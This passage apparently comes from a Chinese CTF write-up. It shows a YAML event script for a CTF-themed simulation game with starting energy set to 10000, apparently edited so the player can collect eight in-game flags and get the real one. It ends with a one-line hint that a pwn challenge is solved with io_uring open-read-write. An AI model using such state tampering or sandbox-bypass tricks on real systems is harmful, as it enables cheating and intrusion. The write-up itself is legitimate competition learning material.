<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">- id: Init</span><br><span class="line">  trigger: Initialization</span><br><span class="line">  once: <span class="literal">true</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: UpdateVariableLimits</span><br><span class="line">      updates:</span><br><span class="line">        player.energy: [<span class="number">0</span>, <span class="number">10000</span>]</span><br><span class="line">    - id: UpdateVariables</span><br><span class="line">      updates:</span><br><span class="line">        elapsedHour: <span class="number">0</span></span><br><span class="line">        hour: <span class="number">8</span></span><br><span class="line">        day: <span class="number">1</span></span><br><span class="line">        player.energy: <span class="number">10000</span></span><br><span class="line">        player.examLevel: <span class="number">0</span></span><br><span class="line">        player.hourSkipped: <span class="number">0</span></span><br><span class="line"># Game tick loop</span><br><span class="line">- id: GameTick</span><br><span class="line">  trigger: Tick</span><br><span class="line">  actions:</span><br><span class="line">    - id: UpdateVariables</span><br><span class="line">      updates:</span><br><span class="line">        elapsedHour: elapsedHour + <span class="number">1</span></span><br><span class="line">        hour: (hour % <span class="number">24</span>) + <span class="number">1</span></span><br><span class="line">        day: floor((elapsedHour + <span class="number">9</span>) / <span class="number">24</span>) + <span class="number">1</span></span><br><span class="line">    - id: TriggerEvents</span><br><span class="line">      triggers:</span><br><span class="line">        - id: HourBegin</span><br><span class="line"># Game begin event</span><br><span class="line">- id: TheBeginning</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  once: <span class="literal">true</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: DisplayChoices</span><br><span class="line">      message: message.beginning</span><br><span class="line">      choices:</span><br><span class="line">        - message: message.acceptCTF</span><br><span class="line">          actions:</span><br><span class="line">            - id: DisplayMessage</span><br><span class="line">              message: message.acceptedCTF</span><br><span class="line">              confirm: message.excited</span><br><span class="line">            - id: DisplayMessage</span><br><span class="line">              message: message.examNotice</span><br><span class="line">              confirm: message.ok</span><br><span class="line">            - id: SetStatus</span><br><span class="line">              statusId: freshness</span><br><span class="line">              on: <span class="literal">true</span></span><br><span class="line">        - message: message.declineCTF</span><br><span class="line">          actions:</span><br><span class="line">            - id: EndGame</span><br><span class="line">              message: message.declinedCTF</span><br><span class="line">              confirm: message.restartNewTimeline</span><br><span class="line">              winning: <span class="literal">true</span></span><br><span class="line">      confirm: message.excited</span><br><span class="line">  </span><br><span class="line">- id: HourSkipUpdate</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  actions:</span><br><span class="line">  - id: UpdateVariables</span><br><span class="line">    updates:</span><br><span class="line">      player.hourSkipped: max(player.hourSkipped - <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"># Energy</span><br><span class="line"># <span class="number">-10</span> <span class="keyword">for</span> day time</span><br><span class="line">- id: EneryUpdateDayTime</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">  - id: Expression</span><br><span class="line">    expression: elapsedHour &gt; <span class="number">1</span> &amp;&amp; hour &gt;= <span class="number">7</span> &amp;&amp; hour &lt; <span class="number">23</span> &amp;&amp; player.hourSkipped === <span class="number">0</span></span><br><span class="line">  actions:</span><br><span class="line">  - id: UpdateVariables</span><br><span class="line">    updates:</span><br><span class="line">      player.energy: player.energy - <span class="number">10</span></span><br><span class="line"># <span class="number">-20</span> <span class="keyword">for</span> night time</span><br><span class="line">- id: EneryUpdateNightTime</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">  - id: Expression</span><br><span class="line">    expression: elapsedHour &gt; <span class="number">1</span> &amp;&amp; (hour &lt; <span class="number">7</span> || hour &gt;= <span class="number">23</span>) &amp;&amp; player.hourSkipped === <span class="number">0</span></span><br><span class="line">  actions:</span><br><span class="line">  - id: UpdateVariables</span><br><span class="line">    updates:</span><br><span class="line">      player.energy: player.energy - <span class="number">20</span></span><br><span class="line"># may have addition energy change</span><br><span class="line">- id: EneryUpdateEffective</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">  - id: Expression</span><br><span class="line">    expression: elapsedHour &gt; <span class="number">1</span> &amp;&amp; player.hourSkipped === <span class="number">0</span></span><br><span class="line">  actions:</span><br><span class="line">  - id: UpdateVariables</span><br><span class="line">    updates:</span><br><span class="line">      player.energy: player.energy + calcEffectValue(<span class="string">&#x27;player.energyBoost&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">- id: LostAllEnergy</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: player.energy &lt;= <span class="number">0</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: EndGame</span><br><span class="line">      message: message.lostAllEnergy</span><br><span class="line">      confirm: message.restart</span><br><span class="line">      winning: <span class="literal">false</span></span><br><span class="line"># exam event</span><br><span class="line">- id: Qualify</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  once: <span class="literal">true</span></span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      # <span class="number">19</span>:<span class="number">00</span> pm - <span class="number">8</span>:<span class="number">00</span> = <span class="number">11</span></span><br><span class="line">      expression: elapsedHour === <span class="number">11</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: CoinFlip</span><br><span class="line">      probability: player.examLevel * <span class="number">0.25</span></span><br><span class="line">      success:</span><br><span class="line">        - id: DisplayMessage</span><br><span class="line">          message: message.examPassed</span><br><span class="line">          confirm: message.great</span><br><span class="line">        - id: UpdateVariables</span><br><span class="line">          updates:</span><br><span class="line">            # exam is tired <span class="keyword">for</span> sure</span><br><span class="line">            player.energy: player.energy - <span class="number">10</span></span><br><span class="line">            player.hourSkipped: <span class="number">1</span></span><br><span class="line">      fail:</span><br><span class="line">        - id: EndGame</span><br><span class="line">          winning: <span class="literal">false</span></span><br><span class="line">          message: message.examFailed</span><br><span class="line">          confirm: message.restart</span><br><span class="line"></span><br><span class="line"># main choices</span><br><span class="line"># insight -&gt; draft exploit -&gt; tuned exploit -&gt; submitted flag</span><br><span class="line">- id: HourBeginTasks</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: player.hourSkipped === <span class="number">0</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: DisplayChoices</span><br><span class="line">      message: message.newHour</span><br><span class="line">      choices:</span><br><span class="line">        - message: message.studyExam</span><br><span class="line">          requirement: elapsedHour &lt; <span class="number">11</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: UpdateVariables</span><br><span class="line">              updates:</span><br><span class="line">                player.examLevel: player.examLevel + <span class="number">1</span></span><br><span class="line">                # study is tired</span><br><span class="line">                player.energy: player.energy - <span class="number">10</span></span><br><span class="line">            - id: Switch</span><br><span class="line">              branches:</span><br><span class="line">                - condition: player.examLevel &lt; <span class="number">4</span></span><br><span class="line">                  actions:</span><br><span class="line">                    - id: DisplayMessage</span><br><span class="line">                      message: message.examLevelUp</span><br><span class="line">                      confirm: message.great</span><br><span class="line">                - condition: <span class="number">1</span></span><br><span class="line">                  actions:</span><br><span class="line">                    - id: DisplayMessage</span><br><span class="line">                      message: message.examLevelMax</span><br><span class="line">                      confirm: message.great</span><br><span class="line">        - message: message.tryCTF</span><br><span class="line">          requirement: elapsedHour &lt;= <span class="number">48</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: CoinFlip</span><br><span class="line">              # TODO</span><br><span class="line">              # <span class="number">1.</span> <span class="keyword">if</span> the player is energetic, possibly</span><br><span class="line">              # <span class="number">2.</span> <span class="keyword">if</span> the player try many times, possibly</span><br><span class="line">              probability: <span class="number">0.60</span></span><br><span class="line">              success:</span><br><span class="line">                - id: GiveItem</span><br><span class="line">                  itemId: insight</span><br><span class="line">                  amount: <span class="number">1</span></span><br><span class="line">                - id: DisplayRandomMessage</span><br><span class="line">                  messages:</span><br><span class="line">                    - message.gainInsight1</span><br><span class="line">                    - message.gainInsight2</span><br><span class="line">                  confirm: message.great</span><br><span class="line">                # good insight is encouraing</span><br><span class="line">                - id: CoinFlip</span><br><span class="line">                  probability: <span class="number">0.2</span></span><br><span class="line">                  success:</span><br><span class="line">                    - id: DisplayMessage</span><br><span class="line">                      message: message.goodInsight</span><br><span class="line">                      confirm: message.encouraging</span><br><span class="line">                    - id: UpdateVariables</span><br><span class="line">                      updates:</span><br><span class="line">                        player.energy: player.energy + <span class="number">10</span></span><br><span class="line">              fail:</span><br><span class="line">                - id: DisplayRandomMessage</span><br><span class="line">                  messages:</span><br><span class="line">                    - message.noInsight1</span><br><span class="line">                    - message.noInsight2</span><br><span class="line">                  confirm: message.oops</span><br><span class="line">                # dis-encouraging</span><br><span class="line">                - id: UpdateVariable</span><br><span class="line">                  variable: player.energy</span><br><span class="line">                  value: player.energy - <span class="number">5</span></span><br><span class="line">        - message: message.workOnInsight</span><br><span class="line">          requirement: itemCount(<span class="string">&#x27;insight&#x27;</span>) &gt; <span class="number">0</span> &amp;&amp; elapsedHour &lt;= <span class="number">48</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: CoinFlip</span><br><span class="line">              # same, energy and try time</span><br><span class="line">              # most insight should gets to exploit</span><br><span class="line">              probability: <span class="number">0.8</span></span><br><span class="line">              success:</span><br><span class="line">                - id: DisplayMessage</span><br><span class="line">                  message: message.gainDraftExp</span><br><span class="line">                  confirm: message.soundsInteresting</span><br><span class="line">                - id: GiveItem</span><br><span class="line">                  itemId: draftExp</span><br><span class="line">                  amount: <span class="number">1</span></span><br><span class="line">              fail:</span><br><span class="line">                - id: DisplayRandomMessage</span><br><span class="line">                  messages:</span><br><span class="line">                    - message.badInsight1</span><br><span class="line">                    - message.badInsight2</span><br><span class="line">                    - message.badInsight3</span><br><span class="line">                  confirm: message.unfortunate</span><br><span class="line">            - id: GiveItem</span><br><span class="line">              itemId: insight</span><br><span class="line">              amount: <span class="number">-1</span></span><br><span class="line">        - message: message.workOnDraftExp</span><br><span class="line">          requirement: itemCount(<span class="string">&#x27;draftExp&#x27;</span>) &gt; <span class="number">0</span> &amp;&amp; elapsedHour &lt;= <span class="number">48</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: CoinFlip</span><br><span class="line">              # same, energy and try time</span><br><span class="line">              probability: <span class="number">0.7</span></span><br><span class="line">              success:</span><br><span class="line">                - id: DisplayMessage</span><br><span class="line">                  message: message.gainTunedExp</span><br><span class="line">                  confirm: message.soundsInteresting</span><br><span class="line">                - id: UpdateItemAmounts</span><br><span class="line">                  updates:</span><br><span class="line">                    draftExp: <span class="number">-1</span></span><br><span class="line">                    tunedExp: <span class="number">1</span></span><br><span class="line">              fail:</span><br><span class="line">                - id: DisplayRandomMessage</span><br><span class="line">                  messages:</span><br><span class="line">                    - message.noTunedExp1</span><br><span class="line">                    - message.noTunedExp2</span><br><span class="line">                  confirm: message.unfortunate</span><br><span class="line">                - id: UpdateVariable</span><br><span class="line">                  variable: player.energy</span><br><span class="line">                  value: player.energy - <span class="number">5</span></span><br><span class="line">        - message: message.workTunedExp</span><br><span class="line">          requirement: itemCount(<span class="string">&#x27;tunedExp&#x27;</span>) &gt; <span class="number">0</span> &amp;&amp; elapsedHour &lt;= <span class="number">48</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: CoinFlip</span><br><span class="line">              # same, energy and try time, and flag (more flag then harder)</span><br><span class="line">              probability: <span class="number">0.7</span></span><br><span class="line">              success:</span><br><span class="line">                - id: DisplayMessage</span><br><span class="line">                  message: message.gainFlag</span><br><span class="line">                  confirm: message.great</span><br><span class="line">                - id: UpdateItemAmounts</span><br><span class="line">                  updates:</span><br><span class="line">                    submittedFlag: <span class="number">1</span></span><br><span class="line">                    tunedExp: <span class="number">-1</span></span><br><span class="line">              fail:</span><br><span class="line">                - id: DisplayRandomMessage</span><br><span class="line">                  messages:</span><br><span class="line">                    - message.noflag1</span><br><span class="line">                    - message.noflag2</span><br><span class="line">                    - message.noflag3</span><br><span class="line">                  confirm: message.damn</span><br><span class="line">                - id: UpdateVariables</span><br><span class="line">                  updates:</span><br><span class="line">                    player.energy: player.energy - <span class="number">5</span></span><br><span class="line">        - message: message.resubmitFlag</span><br><span class="line">          requirement: itemCount(<span class="string">&#x27;wrongFlag&#x27;</span>) &gt; <span class="number">0</span> &amp;&amp; elapsedHour &lt; <span class="number">48</span></span><br><span class="line">          actions:</span><br><span class="line">            - id: DisplayMessage</span><br><span class="line">              message: message.resubmitComplete</span><br><span class="line">              confirm: message.hopeAccepted</span><br><span class="line">            - id: UpdateItemAmounts</span><br><span class="line">              updates:</span><br><span class="line">                resubmittedFlag: <span class="number">1</span></span><br><span class="line">                wrongFlag: <span class="number">-1</span></span><br><span class="line">        # day time -&gt; slack off</span><br><span class="line">        - message: message.slackOff</span><br><span class="line">          requirement: <span class="string">&quot;hour &lt; 23 &amp;&amp; hour &gt;= 7&quot;</span></span><br><span class="line">          actions:</span><br><span class="line">            # random decide bonus energy</span><br><span class="line">            - id: Random</span><br><span class="line">              groups:</span><br><span class="line">                - weight: <span class="number">1</span></span><br><span class="line">                  actions:</span><br><span class="line">                    - id: DisplayRandomMessage</span><br><span class="line">                      messages:</span><br><span class="line">                        - message.caughtSlackOff1</span><br><span class="line">                        - message.caughtSlackOff2</span><br><span class="line">                      confirm: message.oops</span><br><span class="line">                - weight: <span class="number">2</span></span><br><span class="line">                  actions:</span><br><span class="line">                    - id: DisplayMessage</span><br><span class="line">                      message: message.slackOffSuccess</span><br><span class="line">                      confirm: message.great</span><br><span class="line">                    - id: UpdateVariable</span><br><span class="line">                      variable: player.energy</span><br><span class="line">                      value: player.energy + <span class="number">5</span></span><br><span class="line">            - id: UpdateVariables</span><br><span class="line">              updates:</span><br><span class="line">                player.energy: player.energy + <span class="number">35</span></span><br><span class="line">            - id: SetStatus</span><br><span class="line">              statusId: exhaustion</span><br><span class="line">              on: <span class="literal">false</span></span><br><span class="line">        # night time -&gt; sleep</span><br><span class="line">        - message: message.nap</span><br><span class="line">          requirement: <span class="string">&quot;!(hour &lt; 23 &amp;&amp; hour &gt;= 7)&quot;</span></span><br><span class="line">          actions:</span><br><span class="line">          - id: DisplayMessage</span><br><span class="line">            message: message.napSuccess</span><br><span class="line">            confirm: message.great</span><br><span class="line">          - id: UpdateVariables</span><br><span class="line">            updates:</span><br><span class="line">              player.energy: <span class="number">100</span></span><br><span class="line">              player.hourSkipped: <span class="number">3</span></span><br><span class="line">          - id: SetStatus</span><br><span class="line">            statusId: exhaustion</span><br><span class="line">            on: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># flag check events</span><br><span class="line">- id: flagCheck</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: itemCount(<span class="string">&#x27;submittedFlag&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: CoinFlip</span><br><span class="line">      probability: <span class="number">0.6</span></span><br><span class="line">      success:</span><br><span class="line">        - id: DisplayMessage</span><br><span class="line">          message: message.flagAccepted</span><br><span class="line">          confirm: message.bravo</span><br><span class="line">        - id: UpdateItemAmounts</span><br><span class="line">          updates:</span><br><span class="line">            submittedFlag: <span class="number">-1</span></span><br><span class="line">            flag: <span class="number">1</span></span><br><span class="line">        - id: UpdateVariables</span><br><span class="line">          updates:</span><br><span class="line">            player.energy: player.energy + <span class="number">10</span></span><br><span class="line">        - id: CoinFlip</span><br><span class="line">          probability: <span class="number">0.5</span> - (elapsedHour / <span class="number">48</span>)</span><br><span class="line">          success:</span><br><span class="line">            - id: DisplayMessage</span><br><span class="line">              message: message.firstblood</span><br><span class="line">              confirm: message.encouraging</span><br><span class="line">            - id: SetStatus</span><br><span class="line">              statusId: firstblood</span><br><span class="line">              on: <span class="literal">true</span></span><br><span class="line">      fail:</span><br><span class="line">        - id: DisplayRandomMessage</span><br><span class="line">          messages:</span><br><span class="line">            - message.flagRejected1</span><br><span class="line">            - message.flagRejected2</span><br><span class="line">          confirm: message.unfortunate</span><br><span class="line">        - id: UpdateItemAmounts</span><br><span class="line">          updates:</span><br><span class="line">            submittedFlag: <span class="number">-1</span></span><br><span class="line">            wrongFlag: <span class="number">1</span></span><br><span class="line">        - id: UpdateVariable</span><br><span class="line">          variable: player.energy</span><br><span class="line">          value: player.energy - <span class="number">10</span></span><br><span class="line">- id: ResubmittedFlagCheck</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: itemCount(<span class="string">&#x27;resubmittedFlag&#x27;</span>) &gt;= <span class="number">1</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: CoinFlip</span><br><span class="line">      probability: <span class="number">0.85</span></span><br><span class="line">      success:</span><br><span class="line">        - id: DisplayMessage</span><br><span class="line">          message: message.resubmittedFlagAccepted</span><br><span class="line">          confirm: message.bravo</span><br><span class="line">        - id: UpdateItemAmounts</span><br><span class="line">          updates:</span><br><span class="line">            resubmittedFlag: <span class="number">-1</span></span><br><span class="line">            flag: <span class="number">1</span></span><br><span class="line">        - id: UpdateVariables</span><br><span class="line">          updates:</span><br><span class="line">            player.energy: player.energy + <span class="number">10</span></span><br><span class="line">      fail:</span><br><span class="line">        - id: DisplayRandomMessage</span><br><span class="line">          messages:</span><br><span class="line">            - message.resubmittedFlagRejected</span><br><span class="line">          confirm: message.unfortunate</span><br><span class="line">        - id: UpdateItemAmounts</span><br><span class="line">          updates:</span><br><span class="line">            resubmittedFlag: <span class="number">-1</span></span><br><span class="line">            wrongFlag: <span class="number">1</span></span><br><span class="line">        - id: UpdateVariable</span><br><span class="line">          variable: player.energy</span><br><span class="line">          value: player.energy - <span class="number">20</span></span><br><span class="line"># tired</span><br><span class="line">- id: Exhaustion</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">  - id: Expression</span><br><span class="line">    expression: <span class="string">&quot;!hasStatus(&#x27;exhaustion&#x27;) &amp;&amp; player.energy &lt; 40&quot;</span></span><br><span class="line">  actions:</span><br><span class="line">  - id: DisplayMessage</span><br><span class="line">    message: message.exhaustion</span><br><span class="line">    confirm: message.sucks</span><br><span class="line">  - id: SetStatus</span><br><span class="line">    statusId: exhaustion</span><br><span class="line">    on: <span class="literal">true</span></span><br><span class="line"># captain comments</span><br><span class="line"># TODO: unhappy captain</span><br><span class="line">- id: ExamReminder</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  once: <span class="literal">true</span></span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: elapsedHour &gt;= <span class="number">6</span> &amp;&amp; player.examLevel &lt;= <span class="number">2</span></span><br><span class="line">  actions:</span><br><span class="line">    - id: DisplayMessage</span><br><span class="line">      message: message.examReminder</span><br><span class="line">      confirm: message.gotit</span><br><span class="line"># CTF over</span><br><span class="line">- id: Timeout</span><br><span class="line">  trigger: HourBegin</span><br><span class="line">  conditions:</span><br><span class="line">    - id: Expression</span><br><span class="line">      expression: elapsedHour &gt; <span class="number">48</span></span><br><span class="line">  actions:</span><br><span class="line">  - id: EndGame</span><br><span class="line">    message: message.gameover</span><br><span class="line">    confirm: message.restart</span><br><span class="line">    winning: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>然后正常打拿完8个flag就可以触发check获得flag</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MzEyMGI3OWUyZjE4NjUzZmJiZGRlNWYzZjkyYjYyMWNfOUwwbUN3VVB6Q3k0UkNoZnAxZVBFaVlSSzhqSDM0VG9fVG9rZW46SUxSRmJUaHo4b0xaV0R4Q1lKMWNOcGc3bkNnXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h3><span id="master-of-orw">master-of-orw</span><a href="#master-of-orw" class="header-anchor"></a></h3><p>利用io_uring系统调用orw。</p>
